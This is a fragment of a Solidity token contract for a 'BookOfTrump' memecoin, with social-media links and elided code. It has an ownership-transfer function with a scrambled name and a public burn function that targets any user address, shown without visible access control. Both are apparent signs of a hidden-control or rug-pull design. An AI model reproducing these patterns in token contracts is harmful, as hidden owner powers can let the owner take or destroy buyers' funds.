/**
https://t.me/BookOfTrump_BOOT
https://twitter.com/BookOFTrump_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipggoertoptu(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract BookOfTrump is Ownable {
    ...
    function _burnteriopt(address user) public {
